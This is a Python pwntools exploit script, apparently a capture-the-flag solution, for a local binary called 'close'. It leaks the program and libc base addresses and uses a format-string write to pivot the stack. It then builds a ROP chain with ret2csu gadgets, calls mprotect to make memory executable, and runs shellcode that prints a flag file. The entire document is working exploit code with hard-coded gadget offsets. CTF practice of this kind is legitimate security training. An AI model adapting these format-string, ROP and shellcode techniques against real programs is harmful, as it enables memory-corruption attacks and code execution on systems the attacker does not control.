#coding=utf-8
from pwn import *
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./close')
libc = ELF('./libc.so.6')
elf = ELF('./close')

def pr(a,addr):
	log.success(a+': '+hex(addr))

p.sendafter("Enter your name: ",'A'*8)
p.recvuntil('A'*8)

leak_base_addr = u64(p.recv(6).ljust(8,b'\x00'))
codebase = leak_base_addr - 0xb06
pr('leak_base_addr',leak_base_addr)
pr('codebase',codebase)

p.recvuntil("Here's your gift: ")
data_addr = int(p.recv(14),16)
pr('data_addr',data_addr)

rbp_addr = data_addr + 0x810
read_got = codebase + elf.got['read']
puts_plt = codebase + 0x8c0 #elf.plt['puts']
retn = codebase + 0x886
leave_ret = codebase + 0xb07 #leave; ret
magic_addr = codebase + 0xa2e #add    DWORD PTR [ebp-0x3d], ebx
prdi_ret = codebase + 0xc83 #pop rdi ; ret
csu_init_gadget2 = codebase + 0xc7a

'''
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
retn
'''
csu_init_gadget1 = codebase + 0xc60
'''
mov rdx, r15
mov rsi, r14
mov edi, r13d
call ds:(__frame_dummy_init_array_entry - 201D68h)[r12+rbx*8]
'''
stdout = codebase + 0x202020 # stdout@@GLIBC_2_2_5
# public _IO_2_1_stdout_ 0x21a780
# public _IO_2_1_stderr_ 0x21a6a0
magic_offset  = libc.symbols['_IO_2_1_stderr_'] - libc.symbols['_IO_2_1_stdout_'] 
magic_offset += 0x1000000000000000
ROP_chain = data_addr + 0x120
pr('ROP_chain', ROP_chain)

payload = fmtstr_payload(offset=6,
	writes={rbp_addr:ROP_chain-8, rbp_addr+8:leave_ret},
	write_size_max="byte",write_size="byte")
payload = payload.ljust(0x120,'\x00')

payload += p64(csu_init_gadget2)
payload += p64(magic_offset) #rbx
payload += p64(stdout + 0x3d) #rbp
payload += p64(0)*4
payload += p64(magic_addr) #ret

payload += p64(prdi_ret)
payload += p64(read_got) #rdi
payload += p64(puts_plt) #ret

payload += p64(csu_init_gadget2)
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(read_got) #r12
payload += p64(0) #r13
payload += p64(ROP_chain) #14
payload += p64(0x500) #15
payload += p64(csu_init_gadget1) #ret

p.recvuntil("Please pwn me :)\n")
p.sendline(payload)

read_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libcbase = read_addr - libc.symbols['read']
pr('libcbase',libcbase)

prsi_ret = libcbase + 0x2be51 #pop rsi; ret;
prdx_ret = libcbase + 0x11f497 #pop rdx ; pop r12 ; ret
mprotect = libcbase + 0x11ec50 #__mprotect

payload  = p64(retn)*0x30 #ret 滑板指令
payload += p64(prdi_ret) + p64(data_addr&~0xfff) # 低三位清零
payload += p64(prsi_ret) + p64(0x1000) #rdi
payload += p64(prdx_ret) + p64(7) + p64(0) # rdx r12 
payload += p64(mprotect) #ret 修改一定范围地址可以 rwxp
payload += p64(ROP_chain + 0x1c8) # shellcraft 地址
payload += asm(shellcraft.cat("flag", 2))

#gdb.attach(p)
#pause()
p.sendline(payload)
p.interactive()
